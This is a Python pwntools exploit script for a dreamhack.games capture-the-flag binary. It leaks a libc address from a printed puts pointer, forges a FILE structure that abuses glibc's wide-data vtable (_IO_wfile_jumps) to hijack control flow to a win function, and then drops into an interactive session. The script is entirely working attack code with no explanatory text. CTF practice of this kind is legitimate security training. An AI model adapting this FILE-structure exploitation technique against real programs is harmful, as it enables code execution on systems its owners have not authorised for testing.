#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host3.dreamhack.games", 15308)

    return r


def main():
    p = conn()
    p.recvuntil (b'puts @ ')
    tmp = p.recvline ()[:-1]
    libc_leak = int (tmp.decode(), 16)
    libc.address = libc_leak - libc.sym['puts']
    print ("The address of libc is: ", hex (libc.address))
    
    win = 0x401186

    payload = flat({
        0x00: 0xfbad2887,
        0x08: libc.sym['_IO_wide_data_0'],
        0x20: libc.sym['_IO_2_1_stderr_'] + 0x30,
        0x28: libc.sym['_IO_2_1_stderr_'] + 0x30,
        0x30: libc.sym['_IO_2_1_stdout_'] + 0x48 - 0x68, # _wide_vtable
        0x48: win,
        0x58: libc.sym['_IO_wfile_jumps'],
        0x68: libc.sym['_IO_2_1_stderr_'] + 0x60
    }, filler=b'\x00')

    p.send (bytes (payload))

    # p.send (b'A' * 0x70)

    p.interactive()


if __name__ == "__main__":
    main()
